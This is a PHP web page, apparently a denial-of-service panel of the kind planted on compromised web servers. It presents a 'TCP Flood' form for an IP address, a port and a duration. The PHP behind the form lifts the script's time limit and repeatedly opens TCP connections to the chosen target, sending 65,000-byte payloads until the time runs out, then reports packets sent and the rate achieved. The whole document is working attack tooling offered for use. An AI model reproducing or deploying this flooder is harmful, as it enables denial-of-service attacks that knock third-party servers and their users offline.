       <html>
   	 <head>
   	   <?php
    	   $ip = $_SERVER['REMOTE_ADDR'];
   	  ?>
   	 </head>
    <body bgcolor="black">



    <center>
    <font face="Arial" color="white">
    <pre>
    <b>

                  
    <center><b>Your IP:</b> <font color="red"><?php echo $ip; ?></font><br><br></center>
    </pre>
    <STYLE>
    
    
input
{
background-color: transparent; font-size: 14pt; color: lime; font-family: Arial; border: 1 solid lime;
}    
button
{
background-color: lime; font-size: 14pt; color: lime; font-family: Arial; border: 2 solid red;
}
    
    body 
    {
    background-color: black;
    }
    
    </style>
    <?php
    //TCP
    if(isset($_GET['host'])&&isset($_GET['time'])){
        $packets = 0;
        ignore_user_abort(FALSE);
        set_time_limit(0);
       
        $exec_time = $_GET['time'];
       
        $time = time();
        echo "Started: ".time('d-m-y h:i:s')."<br>";
        $max_time = $time+$exec_time;
     
        $host = $_GET['host'];
        $port = $_GET['port'];
       
        for($i=0;$i<65000;$i++){
                $out .= 'X';
        }
        while(1){
        $packets++;
                if(time() > $max_time){
                        break;
                }               
                $fp = fsockopen('tcp://'.$host, $port, $errno, $errstr, 5);
                if($fp){
                        fwrite($fp, $out);
                        fclose($fp);
                }
        }
        echo "<br><b>TCP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
        echo '<br><br>
        
            <form action="'.$surl.'" method=GET>
            
            <input type="hidden" name="act" value="phptools">
            
            IP: <br><input type=text name=host><br>
                        
            Port: <br><input type=text name=port><br> 
            
            Length (seconds): <br><input type=text name=time><br>
            
            <input type=submit value=Go></form>';
            
    }else{ echo '<br><b>TCP Flood</b><br>
    
                <form action=? method=GET>
                
                <input type="hidden" name="act" value="phptools">
                
                IP: <br><input type=text name=host value=><br>
                
                Port: <br><input type=text name=port><br>
                
                Length (seconds): <br><input type=text name=time value=><br><br>
                
                <input type=submit value=Go></form>';
    }
    ?>
    </b>
    </center>
    </body>
    </html>